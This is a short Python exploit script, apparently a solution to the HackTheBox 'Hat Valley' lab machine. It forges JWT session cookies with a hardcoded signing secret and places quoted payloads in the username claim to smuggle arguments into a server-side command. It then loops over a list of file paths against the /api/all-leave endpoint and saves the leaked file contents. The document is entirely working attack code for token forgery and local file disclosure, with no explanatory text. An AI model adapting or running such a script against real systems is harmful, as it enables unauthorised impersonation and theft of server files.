import jwt
import time
import requests
from requests_toolbelt.utils import dump
from slugify import slugify
from tqdm import tqdm

RHOST = 'http://hat-valley.htb'
OUT_DIR = './out/'

with open('./lfi_files', 'r') as payloads:
    for payload in tqdm(payloads, leave=False):
        extended_payload = "/' " + payload.strip() + " '"

        encoded_payload = jwt.encode({"username": extended_payload,
                                      "iat": str(time.time()).split('.')[0]},
                                     "123beany123", algorithm="HS256")

        r = requests.get(RHOST + '/api/all-leave',
                         cookies={'token': encoded_payload})
        if r.text != 'Failed to retrieve leave requests':
            with open(OUT_DIR + slugify(payload), 'w') as out:
                out.write(r.text)
                print(payload, encoded_payload)
